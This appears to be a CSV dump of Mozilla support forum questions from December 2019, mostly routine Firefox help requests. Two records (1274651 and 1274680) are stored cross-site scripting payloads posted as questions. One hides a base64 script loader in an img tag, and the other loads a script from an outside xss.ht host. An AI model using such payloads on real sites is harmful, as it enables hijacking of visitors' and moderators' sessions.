id,created,url,title,content,tags
1274555,2019-12-07 18:29:34 -0800,https://support.mozilla.org/questions/1274555,No convenient way to rate all installed extensions,"I've been using Firefox for a while and I came across some great extensions.
I would like to give each of them a rating to help other people find better extensions, but there seems no easy way to do so.
On Google Play you can review installed extensions in Play Store easily by cl...",firefox-710;customize;desktop;linux;
1274556,2019-12-07 18:33:47 -0800,https://support.mozilla.org/questions/1274556,Numerous Addons not working after fresh install version 71.0 on Fedora 31,"I just reinstall Firefox version 71.0 on my main workstation running fedora 31 and numerous addons : LastPass Firefox-containers hide/show toolbar Joplin... do not work they install properly but I can't use them.
",fedora31;add-ons;
1274557,2019-12-07 18:33:56 -0800,https://support.mozilla.org/questions/1274557,Numerous Addons not working after fresh install version 71.0 on Fedora 31,"duplicate of /questions/1274556 thread.
I just reinstall Firefox version 71.0 on my main workstation running fedora 31 and numerous addons : LastPass Firefox-containers hide/show toolbar Joplin... do not work they install properly but I can't use them.
",firefox-680;customize;desktop;linux;
1274559,2019-12-07 19:17:08 -0800,https://support.mozilla.org/questions/1274559,Is there a way to always open links in new tabs from a specific tab?,"Hi all,
So I have a pinned tab that is automatically refreshed via an extension. That extension is URL based. From time to time I may accidentally clicked a link on that tab and the URL changed then the auto-refresh stops.
In order to keep the auto-refreshed tab's URL, I would li...",tabs;firefox-710;desktop;windows-10;
1274563,2019-12-07 20:58:16 -0800,https://support.mozilla.org/questions/1274563,Reconnect to firefox sync prompt at every computer restart?,"I recently got a new computer and installed firefox. Every time the computer restarts, it wants me to log in for the sync feature (""Reconnect to Firefox Account"" appears under options with an exclamation point). This did not happen on my old computer, so this is weird because all...",firefox-710;sync;desktop;windows-10;
1274565,2019-12-07 23:08:06 -0800,https://support.mozilla.org/questions/1274565,What does the “PR_END_OF_FILE_ERROR” error mean?,"I was playing around with some SSL settings in Emby, and I managed to get this 'Secure Connection Failed' error which says: An error occurred during a connection to emby.home.local:8920. PR_END_OF_FILE_ERROR
I'm not trying to fix the error, I just want to know what it means. I ca...",firefox-710;desktop;fix-problems;windows-10;emby;probablynotafirefoxproblem;
1274568,2019-12-08 00:45:50 -0800,https://support.mozilla.org/questions/1274568,youtube's relevant videos even in multi-account cointainer add-on,"im concerning about youtubes feed! since im using multi-account container add-on im expecting youtube know nothing about me and my favorite videos but somehow youtube videos are still relevant to my account! ( im clrearing the caches as well!)
what can be wrong ? or how can i fix...",privacy-and-security_1;firefox-710;desktop;windows-10;youtube;multiaccountcontainers;
1274571,2019-12-08 02:13:37 -0800,https://support.mozilla.org/questions/1274571,Firefox synchronisiert keine offene Tabs. Alles andere wird synchronisiert.,"auch die Einrichtung eines weiteren Gerätes hat das Problem nicht gelöst
",firefox-710;sync;desktop;windows-10;
1274572,2019-12-08 02:45:00 -0800,https://support.mozilla.org/questions/1274572,v71 appears to have eliminated the local disconnect/device clear feature,"Usually when I disconnect a two (2) checkbox 'Disconnect Sync' box appears, which after checking removes bookmarks etc from browser.  V71 is not doing this and leaves my personal info in the browser I log in to.
",firefox-710;sync;desktop;windows-10;
1274574,2019-12-08 04:28:14 -0800,https://support.mozilla.org/questions/1274574,Google profile pictures not showing (lh3.googleusercontent.com),"Hi,
Firefox is not showing the Google profile pictures (image1).
- It works on other browsers.
- I tried safe mode.
- I restarted with addons disabled.
- I cleared cache and cookies.
- Browser is up to date.
nothing.
Any image from https://lh3.googleusercontent.com doesn't show.
...",firefox-710;desktop;fix-problems;macos-1015;escalate;picture;notafirefoxproblem;
1274575,2019-12-08 04:34:20 -0800,https://support.mozilla.org/questions/1274575,Auto add www. and .com to address in Quantum,"What use to work in ""about:config"" to auto add prefix (www.) and suffix (.com) doesn't work in Firefox Quantum. Looking for what works.
The ""browser.fixup.alternate.prefix and suffix"" are set to default, string, (www. and .com)
Not sure if default is to apply or not apply.
thanks...",firefox-700;customize;desktop;windows-7;
1274576,2019-12-08 04:52:23 -0800,https://support.mozilla.org/questions/1274576,Installed Flash update.  Firefox disagrees.  Adobe says its already installed. M,"Nothing seems to work.  An appropriate plugin seems to be installed and, after downloading the latest version from Adobe, a retry informed me that Flash was already installed.  Firefox does not agree.  The download from Adobe informs me that upgrading is a 3-stage process but tak...",download-and-install_1;firefox-700;desktop;linux;flash-problem;
1274577,2019-12-08 04:55:01 -0800,https://support.mozilla.org/questions/1274577,Hovering on tabs in fullscreen opens the Mac menu bar,"When I'm using Firefox for Mac in full screen, it happens often that I hover the mouse cursor on one of the tabs, and the Mac menu bar opens and covers the entire tab area (see the screenshot). So I can't choose the tab anymore, and have to move the cursor away from the tab area ...",""
1274578,2019-12-08 04:58:48 -0800,https://support.mozilla.org/questions/1274578,Hovering on tabs opens the Mac menu bar in full screen mode,"duplicate of /questions/1274577 thread.
When you move your mouse cursor on the tab area to select a tab, it happens quite often that the Mac menu bar opens automatically and covers the tab area, thus preventing you from opening the tab (see the screenshot). 
This is a rather inco...",tabs;firefox-710;desktop;mac-os;
1274579,2019-12-08 05:42:33 -0800,https://support.mozilla.org/questions/1274579,How to stop URL bar from enlarging on click?,"I am used to double clicking to select words in the URL bar. Not too long ago Firefox had an update where if you click on the URL bar then it would enlarge a bit. When it enlarges, so does the font, meaning that if I try to double click a word, the font resizing could shift the t...",customize;desktop;windows-10;
1274580,2019-12-08 05:52:11 -0800,https://support.mozilla.org/questions/1274580,new 'dark theme' has awful blue lines/blue highlights and white menus,"new 'dark theme' has awful blue lines/blue highlights and white menus. help!
",firefox-710;customize;desktop;windows-10;needsinfo;
1274583,2019-12-08 06:46:47 -0800,https://support.mozilla.org/questions/1274583,"I've launched in safe mode. Still crashing.  Either tab or program, or both. Iss","Slow and crashes in Chrome and Edge too.
",firefox-710;desktop;fix-problems;windows-10;escalate;outofmemory;
1274584,2019-12-08 06:47:59 -0800,https://support.mozilla.org/questions/1274584,Firefox briefly freezes while loading a new tab,"I'm running Firefox 71 on Linux. I notice that when I load a page into a new tab (either from middle-clicking links, or entering URL manually), Firefox UI is unresponsive for about 2 seconds. During that time, I'm unable to switch tabs--either by clicking, or with Ctrl+Tab. I tri...",firefox-710;desktop;fix-problems;linux;troubleshootingdetailsmissing;
1274585,2019-12-08 06:53:00 -0800,https://support.mozilla.org/questions/1274585,What kind of forum has this become?,"FAQ based forum WT? Like repeated questions?
Again a forced update?
Why does moz have such a serious problem with page tabs next to it's actual page?
Address bar/shortcut bar in between?
HELLO! They are PAGE tabs...not button bar tabs/address bar tabs...PAGE TABS!!!!!
And this ti...",firefox-710;other;desktop;windows-7;unclearquestion;
1274586,2019-12-08 07:10:00 -0800,https://support.mozilla.org/questions/1274586,"firefox interface font is to small for me to read, how to make it larger","the theme and font interface is terribly small, it is barely readable for me without straining my eyes. I am to to point where I have to guess where to click in the drop down menus because the print is so small .
there addon theme and font changer does not work. it has not work f...",firefox-700;customize;desktop;linux;
1274587,2019-12-08 07:34:23 -0800,https://support.mozilla.org/questions/1274587,IT guy changed my password without getting a recovery key; info still exists on ,"I'm trying to switch to a new desktop. IT guy claimed to be a Firefox expert, but, when my password didn't work, he changed it without getting a recovery key. My old setup still exists on my old desktop and my laptop. Is there any way to save what's on either of those two compute...",firefox-710;sync;desktop;
1274589,2019-12-08 08:18:58 -0800,https://support.mozilla.org/questions/1274589,How to change the picture-in-picture default monitor?,"71's new picture-in-picture feature could be useful, but I can't find any way to control which monitor the video is played on. It seems to always open on Windows' 1st monitor, which for me is almost always turned off.
Of course Windows in it's infinite wisdom will not let you cho...",firefox-710;customize;desktop;windows-10;
1274592,2019-12-08 08:49:16 -0800,https://support.mozilla.org/questions/1274592,"How can I access the firefox bookmark ""library"" window so I can rename/move/dele","I am trying to get to the bookmarks library window similar to to the attached. 
I have searched all over but can not seem to find an up to date article.  (even the Mozilla help article is out of date).
",bookmarks;firefox-700;desktop;windows-10;
1274593,2019-12-08 08:50:06 -0800,https://support.mozilla.org/questions/1274593,"I have a Desktop, Hybrid Laptop, and a Google Smartphone. If I sync the bookmark","My Desktop has bookmarks going all the way back to Netscape 1.0 (1995), my LapPad bookmarks go back just a few years. I would like to be able to decide which takes precedence like the Contacts merge in Gmail.
I have been a database user/programmer/coder for the last 50 years, and...",firefox-710;sync;desktop;windows-10;
1274594,2019-12-08 08:53:40 -0800,https://support.mozilla.org/questions/1274594,Firefox Dictionary extension,"This must have been asked over and over, but I've not been here before, so please forgive me. I cannot seem to find a simple dictionary extension for Firefox Quantum, something which defines a highlighted word. The one in Chrome works just fine, but I prefer to use Firefox. We us...",firefox-710;customize;desktop;windows-10;
1274596,2019-12-08 09:13:08 -0800,https://support.mozilla.org/questions/1274596,How can I find a specific add-on on addons.mozilla.org since the search function,I was trying to locate all of my add-ons on https://addons.mozilla.org so I could bookmark them for a backup in case my PC has a figurative meltdown. Some are extremely simple to find but others seem impossible to locate. I even logged into the addons page thinking it would show ...,firefox-710;customize;desktop;windows-7;add-ons;
1274597,2019-12-08 09:18:08 -0800,https://support.mozilla.org/questions/1274597,"I cant start Mozilla Firefox, terminating process doesnt work either.","Hey there, 
today i used my browser completely normal, everything worked just fine.
After i started doing my Windows Updates though and also updated my Anti Virus Software, Mozilla doesn't start anymore, I cant end the task/process either, not even via system32 cmd command (taskk...",desktop;fix-problems;escalate;probablynotafirefoxproblem;
1274599,2019-12-08 09:57:05 -0800,https://support.mozilla.org/questions/1274599,Can't login to uscellular.com,"When I try to login to my account on U.S. Cellular, it immediately takes me to another page that says, ""It's not you, it's us.
An error has occurred, and we can't display this page right now.""  .. except that it isn't.  I can get there fine using either Vivaldi or Google Chrome, ...",firefox-710;websites;desktop;windows-10;uscellularcom;webcompat;
1274600,2019-12-08 10:32:23 -0800,https://support.mozilla.org/questions/1274600,"Used the fix for Tabs on Bottom but lost the top right buttons for minimize, cas","The above pretty much sums it up.  I at least have tabs on bottom and haven't done any coding in 40+ years but I'll try some tweaks but would really like the above mentioned buttons back.
",firefox-710;customize;desktop;windows-10;unsuppportedhacks;unsupporteduserchromecss;userchromecss;unsupported;tabsonbottom71;tabsonbottom;
1274601,2019-12-08 10:53:53 -0800,https://support.mozilla.org/questions/1274601,Firefox 71 Will Not Work On My Windows 7 Laptop,"Hello everyone,
I have a similar problem to those mentioned in the discussions here...
https://support.mozilla.org/en-US/questions/1274248
https://support.mozilla.org/en-US/questions/1274407
..but the solutions given there do not help me here I am afraid.
We use Firefox with auto...",desktop;fix-problems;needsinfo;troubleshootingdetailsmissing;
1274602,2019-12-08 11:20:10 -0800,https://support.mozilla.org/questions/1274602,Firefox Enhanced Tracking Protection doesn't seem to be working,"I was reading an article on Sophos about Firefox and how it is protecting our privacy
https://nakedsecurity.sophos.com/2019/11/27/firefox-gets-tough-on-tracking-tricks-that-sneakily-sap-your-privacy/
In the comments it listed 3 sites to check how unique your browser is:
https://w...",privacy-and-security_1;firefox-710;desktop;windows-10;probablynotafirefoxproblem;
1274603,2019-12-08 11:24:38 -0800,https://support.mozilla.org/questions/1274603,Backup Multi-Account Containers,"Hi Team. I love the Multi-Account Containers for Firefox. It's an excellent extension. However there's not means of archiving, syncing or backup for all your fastidious work configuring your various websites to open within specific containers. If your local Firefox profile is los...",firefox-710;other;desktop;
1274604,2019-12-08 11:36:30 -0800,https://support.mozilla.org/questions/1274604,"I am no longer to click on any of Pinterest's ""windows"". Nothing happens when I ","I am able to access any of the ""windows"" on Pinterest using Chrome but not on Firefox. I believe this started about 3 weeks ago. What am I doing wrong?
",firefox-710;other;desktop;windows-7;
1274605,2019-12-08 11:46:12 -0800,https://support.mozilla.org/questions/1274605,Youtube Music cannot start. It appear shortly and restart to upload again enteri,"My system is LM 19.2 FF Version 70.0.1 (64-Bit). Noted that Chrome in the same machine play YouTube Music without problem and attention Youtube video has no problem to be played in FF.
",websites;firefox-700;desktop;linux;
1274607,2019-12-08 11:55:54 -0800,https://support.mozilla.org/questions/1274607,Set about:config display all by default,"With v71 the about:config page doesn't display the full entries anymore instead you have to click on show all, putting unnecessary wear on mice. Is there a way to reset this to the old behavior where the entries are shown by default?
",firefox-710;customize;desktop;windows-10;configeditor;configeditor71;
1274612,2019-12-08 12:20:48 -0800,https://support.mozilla.org/questions/1274612,"save Bookmarks, History and all open Tabs+Windows of the last session, in a corr","Hello,
I visited my brother during the last week. His iMac was infected with some malware, and, because I have my own account in his computer with the same Apple-ID, also my computer got infected. I spoke with 6 senior technicians from the Europe Apple HQ in Cork / Ireland, but t...",firefox-680;other;desktop;
1274613,2019-12-08 12:45:21 -0800,https://support.mozilla.org/questions/1274613,"In Earthlink e-mail, the tabs above messages (print, delete etc.) work in IE but","Earthlink E-mail both old and new versions do not work properly in Firefox 57 and higher. The function tabs above any message (print, delete etc.) don't respond to clicking.  They used to work just fine.  Everything works in IE but I use Firefox.  The Options are set to open tabs...",firefox-710;desktop;fix-problems;windows-10;
1274614,2019-12-08 12:52:48 -0800,https://support.mozilla.org/questions/1274614,Update of FlashPlayer for LinuxMint via Package Manager does not show in the Add,"My version of Linux Mint is 17.3. FireFox is 64 bit Quantum 66.0.3. I've installed FlashPlayer 32.0.0171 from a Ubunto repository. I've added a screen dump from the Add-ons Manager which has different information
",firefox-660;desktop;linux;
1274615,2019-12-08 13:02:27 -0800,https://support.mozilla.org/questions/1274615,The logo of Amazon in the top bar inside the website (the one on the top left) d,"I thought that this was a problem related to my old laptop. Now, after I got a new laptop, I just signed in into my firefox account and made it sync my data, and to my surprise the amazon logo still does not show up correctly for me on firefox. Please advise! :)
",firefox-710;websites;desktop;windows-10;
1274617,2019-12-08 13:42:13 -0800,https://support.mozilla.org/questions/1274617,Lost firefox password. Can i import everything to safari on my mac and then impo,"I lost my password for Firefox somehow.
I have my secondary email set up.
I have account recovery not enabled
I have two step authentication not enabled
I do not have a saved password in either Firefox itself or on iClouds keychain that works. 
I understand that if I were to rese...",download-and-install_1;firefox-710;desktop;mac-os;
1274620,2019-12-08 13:56:43 -0800,https://support.mozilla.org/questions/1274620,I use latest version of Firefox as my browser. How can I remove the tracking lin,"I use latest version of Firefox as my browser. How can I remove the tracking link, guce.advertising.com which is now attempting to load when opening a tab from my home page www.huffpost.com? I use u-Block Origin, which does recognize this. I also have Malwarebytes pro, Zemana Ant...",firefox-710;desktop;fix-problems;windows-10;
1274623,2019-12-08 14:05:21 -0800,https://support.mozilla.org/questions/1274623,How can I be in safe mode with firefox,"I am truly technologically challenged. I've read everything about strating and/or accessing Safe Mose using Firefox but I don't understand any of them.
Can someone PLEASE, tell me how to do it, step by step, using words a savvy 2 1/2 year old can follow? I'd really appreciate it....",firefox-710;other;desktop;windows-10;
1274624,2019-12-08 14:36:04 -0800,https://support.mozilla.org/questions/1274624,How to make new window open non-maximized.,"I'm very new to Firefox, so I'd appreciate your help.
When I want to view something in a new window, I right-click to bring up the menu, then left-click on ""Open link in new window"".  The new window opens maximized (full screen).  Is there any way to make the new window open less...",firefox-710;other;desktop;windows-7;
1274625,2019-12-08 15:35:28 -0800,https://support.mozilla.org/questions/1274625,"Firefox will not load, doing a clean install of Firefox did not fix the problem.",I have been having problems with firefox lately.  Every time I try to run the program it automatically closes without giving an error message.  I am running Windows 10 and this happens in safe mode as well.   I have tried doing a clean install of firefox - that did not fix the pr...,desktop;fix-problems;windows-10;webcompanion;probablynotafirefoxproblem;webcompanion71;3rdpartysoftware;escalate;download-and-install;
1274626,2019-12-08 15:43:10 -0800,https://support.mozilla.org/questions/1274626,Deleted account log-ins now showing in FF71,"Since FF71 was installed I'm now seeing log-in information for accounts I whacked up to five years ago. When I look at saved log-ins none of these old accounts appear. What gives.
",firefox-710;other;desktop;windows-10;troubleshootingdetailsmissing;
1274632,2019-12-08 19:25:20 -0800,https://support.mozilla.org/questions/1274632,One website page is not displaying properly,As of a few days ago the following website stopped displaying the petitions accurately. (https://www.thepetitionsite.com/takeaction/969/550/917/) The page/s look like they are loading in an html format which makes them useless to me as I CANNOT sign petitions. I checked to see if...,firefox-710;websites;desktop;windows-7;
1274633,2019-12-08 19:34:47 -0800,https://support.mozilla.org/questions/1274633,Firefox 70.1 on iMac Catalina won't remember browser history. Nothing shows in a,"I cannot recall any browser history. I am running Firefox 70.0.1 (64 bit) on my new iMac with Catalina (10.15.1). Every menu for history is empty. I also am unable to delete browsing tabs. I am using Google search engine. Very frustrating...
greats@aol.com
",firefox-710;other;desktop;mac-os;
1274635,2019-12-08 20:52:40 -0800,https://support.mozilla.org/questions/1274635,How to post code on forum?,"How do you post source code on these support forums?
Like below;

TabsToolbar {

position: absolute !important;
bottom: 0 !important;
width: 100vw !important;

}
",firefox-710;other;desktop;windows-7;tabsonbottom71;tabsonbottom;hacks;unsuppportedhacks;unsupporteduserchromecss;userchromecss;
1274637,2019-12-08 21:58:05 -0800,https://support.mozilla.org/questions/1274637,firefox installed. but require the firefox install.,"i installed firefox.
but after a day or two, add-ons pages, 'Only with Firefox—Get Firefox Now' so can't install add-ons.
how to fix it?
",firefox-710;other;desktop;windows-10;
1274640,2019-12-09 01:01:14 -0800,https://support.mozilla.org/questions/1274640,How do i  prevent long list of login credential suggestions,"Hi all,
All of a sudden i get a long list of login credentials suggestions. Normally FF would only just present login cred suggestions for the site name i'm trying to log on, but now i get a long list of them. Also for sites that i'm not on. Is this one of the 'virtues' of LockWi...",tips;firefox-710;desktop;
1274644,2019-12-09 02:32:35 -0800,https://support.mozilla.org/questions/1274644,Please can I waste hours on end with firefox help on non existant problems on ot,"Been trying to open yahoo mail as I need it on a computer not on the phone. I use it every day plenty of times on the phone and laptop. Today I can't open it. Firefox says theres an update, so I download it. I then have to verify my firefox account with my email...of which I cann...",firefox-700;desktop;fix-problems;windows-10;
1274645,2019-12-09 03:08:30 -0800,https://support.mozilla.org/questions/1274645,How can I customize my outgoing email,"I would like to have a pre-setup page as outgoing mail with my name and company details on as a ""footer"".  How do I go about setting this up?
",customize;desktop;
1274646,2019-12-09 03:30:10 -0800,https://support.mozilla.org/questions/1274646,Firefox is requiring a security key be inserted to login to Microsoft.,"I have never had one and never used one.  It will not allow any other type of login.  This does not occur on IE or Chrome.
",firefox-710;desktop;fix-problems;windows-10;troubleshootingdetailsmissing;
1274648,2019-12-09 03:59:28 -0800,https://support.mozilla.org/questions/1274648,"How can I remove bundled search engines (Amazon, Bing, etc.) for good?","Hello, I still have Amazon, Bing, Chambers & co. in my extension list in about:support, even though i have disabled all of them in about:preferences#search. How can I purge them for good?
Firefox 71.0 on Fedora 31.
",firefox-710;customize;desktop;fedora;
1274649,2019-12-09 04:28:28 -0800,https://support.mozilla.org/questions/1274649,thumbnail size in upload dialog (linux),I am using firefox on linux (kde plasma) and when I go to upload a photo in a webpage I get the upload dialog but the thumbnails are too small to view which I really need for photos and there are no view options to change the size of them... This feels like a fundamental feature ...,other;firefox-700;firefox-7001;desktop;linux;
1274651,2019-12-09 05:05:17 -0800,https://support.mozilla.org/questions/1274651,"""><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0",""">
",firefox-710;websites;desktop;
1274652,2019-12-09 05:11:35 -0800,https://support.mozilla.org/questions/1274652,ff is not handling Look-Alike Domains properly,"there is a known issue where scammers setup Look-Alike Domains so the URL appears like  apple.com or your bank to deceive unsuspecting users ... see      https://hackaday.com/2017/04/19/you-think-you-cant-be-phished/
I tested this on ff nightly and the Look-Alike hacked site just...",other;desktop;linux;
1274655,2019-12-09 05:21:19 -0800,https://support.mozilla.org/questions/1274655,How do I hide tab bar scroll buttons in FF 71?,"Before FF 71, I had been using this userChrome CSS to hide the scroll buttons:

TabsToolbar toolbarbutton[class^=""scrollbutton""] {

   display: none !important;
   }

Now it's stopped working. Does anyone know the new code?
",firefox-710;customize;desktop;mac-os;tabbarscrollbutton;tabbarscrollbutton71;hacks;unsupportedhacks;userchromecss;unsupporteduserchromecss;
1274656,2019-12-09 05:35:45 -0800,https://support.mozilla.org/questions/1274656,Secure Connection Failed,"The page you are trying to view cannot be shown because the authenticity of the received data could not be verified
",other;desktop;
1274658,2019-12-09 05:51:36 -0800,https://support.mozilla.org/questions/1274658,firefox crashes at startup,"Overnight (I changed nothing, but microsoft rebooted my computer and I don't see any new files installed or updates) Firefox will not work. I can see it start up in task manager (two processes) but within 1 second both are gone. I've tried uninstalling and reinstalling firefox. S...",firefox-700;desktop;fix-problems;windows-10;escalate;download-and-install;
1274662,2019-12-09 06:44:20 -0800,https://support.mozilla.org/questions/1274662,Login and Password Surround Boxes Not Showing,"When logging into a site that needs a User Name and Password, the actual boxes are not highlighted to insert relevant details. This applies to saved logins as well.  To overcome this issue I have to enter any character to bring up the boxes and then delete this character. The emp...",firefox-680;other;desktop;windows-10;
1274663,2019-12-09 06:48:13 -0800,https://support.mozilla.org/questions/1274663,An extension has disappeared from AMO with no explanation... should I be worried,"I've been using the extension Screengrab! for years, and still have it installed (v2.18), but it seems to have disappeared from the add-ons repository without trace. How do I find out if the author has retired it or if Mozilla have acted over some security fear? The extension sti...",firefox-710;other;desktop;windows-7;screengrab;
1274665,2019-12-09 07:19:47 -0800,https://support.mozilla.org/questions/1274665,"My screen size just changed, there is about a 1/2"" of  my screen saver showing a","This happened when I tried to install adobe flash
",firefox-710;other;desktop;mac-os;
1274667,2019-12-09 07:39:41 -0800,https://support.mozilla.org/questions/1274667,"mac error message: The application 'Firefox"" can't be opened","Tried removing application, empty trash, reinstalled firefox, rebooted mac. Same error. Also tried holding down control and opening program. Did not help. Mac OS 10.14.6.
",desktop;fix-problems;
1274669,2019-12-09 08:16:34 -0800,https://support.mozilla.org/questions/1274669,"After clearing Firefox cache, I can't access gmail.","Firefox was running very slowly, so I cleared the cache. Now I cannot open gmail. When I try, gmail opens a page that prompts me to set up a new account. Gmail opens fine in Safari & Opera. I do not have any security apps loaded that might create a conflict.
",firefox-710;desktop;fix-problems;mac-os;
1274671,2019-12-09 08:55:36 -0800,https://support.mozilla.org/questions/1274671,Is there any way I can prevent an ad-on from being uninstalled/disabled without ,"As the title says
",firefox-710;customize;desktop;windows-10;
1274672,2019-12-09 08:56:36 -0800,https://support.mozilla.org/questions/1274672,Is Firefox account secure?,"I have probably a virus and I reinstall new Windows system. In firefox account is synchronization with my Firefox. But also are AddOns, these addon can be infected. Ask: On account are my addons as files or only infomration about installing addons and there are loaded new?
",privacy-and-security_1;firefox-710;desktop;windows-10;
1274673,2019-12-09 09:00:27 -0800,https://support.mozilla.org/questions/1274673,"Youtube opens a random channel every time I go on Youtube website, how to solve ","Every time I go to youtube.com, a random channel is loaded and I can't get out of it...
I've tried a fresh FireFox install, but the same thing happens all the time
",firefox-710;websites;desktop;windows-10;youtubehd;add-ons;youtubehdproblem;
1274675,2019-12-09 09:08:16 -0800,https://support.mozilla.org/questions/1274675,link to reset password Bad Request,"I get this error when trying to reset password
",firefox-710;other;desktop;windows-7;
1274676,2019-12-09 09:25:01 -0800,https://support.mozilla.org/questions/1274676,I received multiple emails to my personal email account instructing me to confir,"Yesterday I received two separate emails (to my personal email account, separate from the one I used to post this message) from Firefox as part of a new account creation, neither of which I requested.  The first included a link to confirm my email. The second included a verificat...",privacy-and-security_1;desktop;firefox-650;mac-os;
1274677,2019-12-09 09:39:01 -0800,https://support.mozilla.org/questions/1274677,Address was not understood,We use Datto RMM at work and when I go to launch the agent browser(The name of their tool) I get the above error. Most of the time I can close and open Firefox a few times and it will then work. Today however it will not work. I tried running FF in safe mode and still nothing. Th...,firefox-710;desktop;fix-problems;windows-10;dattormm;
1274678,2019-12-09 09:40:26 -0800,https://support.mozilla.org/questions/1274678,Add-ons do not show on toolbar when history is disabled. Can someone explain why,"I have the same issue user irisbis had: https://support.mozilla.org/en-US/questions/1078548
Add-ons do not show in the toolbar when firefox is set to never remember history. I would like to know why this is the case, does somebody understand the reason?
",firefox-700;customize;desktop;linux;
1274680,2019-12-09 10:10:59 -0800,https://support.mozilla.org/questions/1274680,"""><script src=https://xssnoob.xss.ht></script>","""><script src=https://xssnoob.xss.ht></script>
",firefox-710;other;desktop;windows-10;
1274684,2019-12-09 10:57:05 -0800,https://support.mozilla.org/questions/1274684,"Firefox no longer able to open SharePoint documents in app - ""one of the followi","I've been using Firefox for many months and rarely had issues with this, but I've been unable to open documents from SharePoint to the MSFT apps on my computer for the last two weeks. When I have a SharePoint link that I need to open, one of two things happens: 
- if I right-clic...",firefox-710;desktop;fix-problems;windows-10;
1274685,2019-12-09 10:58:29 -0800,https://support.mozilla.org/questions/1274685,"Lockwise in FF 71.0 64bit recording asterisks as password?  On ""no username"" UID","I clicked the green ""Automatically add"" button for ""Troubleshooting information:"" just below this text box, and it took me to a dead page, and lost everything I had typed (yeah, rookie mistake on my part, fine)...  the landing page address: https://addons.mozilla.org/firefox/down...",firefox-710;desktop;fix-problems;escalate;lockwise;
1274686,2019-12-09 11:07:09 -0800,https://support.mozilla.org/questions/1274686,i can't restore data or sync and i lost my bookmarks and logins and ...  what ca,"Signed in to my account but my information will not be restored. What should I do?
",firefox-700;firefox-7001;desktop;sync;windows-10;
1274688,2019-12-09 11:52:03 -0800,https://support.mozilla.org/questions/1274688,ASPERA 3.9 Connect not working on latest firefox ( Dec-12-2019),"The app boots up when prompted thru browser but wont actually work.
",firefox-710;customize;desktop;windows-10;asperaconnect;3rdpartysoftware;
1274689,2019-12-09 11:53:13 -0800,https://support.mozilla.org/questions/1274689,How do I print off my Usernames and Passwords as I was able to do in the past. I,"All I want to do is make a hard copy of my UserNames and Passwords. It used to be easy but not anymore.
",firefox-710;other;desktop;windows-7;
1274693,2019-12-09 13:23:03 -0800,https://support.mozilla.org/questions/1274693,firefox won't let me change search engine at all,"Question.. I have had zero issues in the past when searching things in firefox .. it would go automatically through google..now for somewhat reason it's using timewarner cable search and i've tired the preference button, clicked on search, but where it says default search engine ...",firefox-710;other;desktop;mac-os;
1274696,2019-12-09 14:08:31 -0800,https://support.mozilla.org/questions/1274696,Middle click opens a new window,"I have issues with my mousewheel so I like to press Middleclick to open this circle, in which I then move my mouse up or down to scroll. It's also called ""Auto Scroll"".
The trouble is, when you activate it on a link, it opens a new tab instead of activating auto scroll. So thats ...",tabs;firefox-710;desktop;windows-10;
1274697,2019-12-09 14:10:58 -0800,https://support.mozilla.org/questions/1274697,How do I add other websites to the Facebook Container? I'm given no option to do,"I'd like the ""share"" option to work when I'm on impeach.org. But there's no option to do so. When I click the ""fence"" icons on this site, I'm given no option to add the site. Though I've seen that option on other sites.
",firefox-700;customize;desktop;firefox-7001;mac-os;
1274698,2019-12-09 14:42:24 -0800,https://support.mozilla.org/questions/1274698,Foxfire is not connecting to the internet. I keep getting cannot find server,"dupe of https://support.mozilla.org/en-US/questions/1274700
Foxfire is not connecting to the internet. I keep getting cannot find server
",other;desktop;
1274699,2019-12-09 14:44:05 -0800,https://support.mozilla.org/questions/1274699,Site might add malware disguised as a Firefox Add-on: intuitTax2020.com,"After I clicked on ""Accept"", it did NOT offer the option to proceed to ""intuitTax2020.com"" without adding the Add-on, as promised.  I also could not find a ""Safety Search"" Add-on in the Firefox ""about: addons""  page.  (I have never heard of the ""Firefox Store"".)
",firefox-700;customize;desktop;windows-10;maleware;
1274700,2019-12-09 14:46:32 -0800,https://support.mozilla.org/questions/1274700,Foxfire is not connecting to the internet. I keep getting cannot find server,"Foxfire is not connecting to the internet. I keep getting cannot find server
",desktop;
1274704,2019-12-09 15:39:05 -0800,https://support.mozilla.org/questions/1274704,"I accidently opened a new profile, now I have lost my bookmarks","I only see one profile listed, so I cannot go back to an old profile.  Is there anyway I can recover?  Thanks, glinfoot
",bookmarks;firefox-710;desktop;windows-10;needsinfo;
